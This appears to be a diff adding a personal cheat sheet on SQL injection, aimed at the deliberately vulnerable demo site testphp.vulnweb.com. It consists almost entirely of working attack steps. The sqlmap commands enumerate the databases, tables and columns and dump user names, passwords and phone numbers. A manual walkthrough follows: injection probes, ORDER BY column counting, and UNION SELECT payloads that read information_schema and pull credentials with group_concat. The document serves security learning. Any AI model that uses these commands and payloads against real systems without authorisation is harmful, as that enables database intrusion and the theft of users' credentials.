@@ -1,0 +1,34 @@
+=======================================================================SQLi=================================================================================
+Sqlmap --> SQL injection is a web security vulnerability that allows an attacker to interfere
+	   with the queries that an application makes to its database.
+
+Tool :- sqlmap --help
+	sqlmap -u <url> <--dbs>
+	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=4 --dbs
+	sqlmap -u <url> <-D(DatabaseName)> <--tables(for find table name in database) >
+ 	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=4 -D acuart --tables
+	sqlmap -u <url> <-D> <-T (give Table Name)> <--columns (for find columns in tables)>
+	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=4 -D acuart -T users --columns
+	sqlmap -u <url> <-D> <-T> <-C (for column name which you want in tables like user and pass)>
+	sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=4 -D acuart -T users -C uname,pass,phone --dump
+	
+Manually -->
+
+-> target website:- testphp.vulnweb.com
+-> find get parameter 
+-> http://testphp.vulnweb.com/listproducts.php?cat=1  =&id=1'
+                                                      or 1=1
+                                                      and sleep(10)
+-> Now find the numbers of columns in database. By using Order by commands.
+    sign is for comment out the error on screen.
+    Use Command #order by 1 --+ for checking 1 number columns
+-> Use command #order by (column no. ) 
+	#order by 15 --+
+
+-> If 15 columns are not available then try less then 15.
+-> then try #order by 11 --+
+-> #union select 1,2,3,4,5,6,7,8,9,10,11 --+
+-> #union select 1,database(),3,4,5,6,version(),8,9,10,11 --+
+-> #union select 1,table_name,3,4,5,6,7,8,9,10,11 from information_schema.tables --+
+-> #union select 1,column_name,3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name='users' --+
+-> #union select 1,group_concat(uname,pass),3,4,5,6,7,8,9,10,11 from users
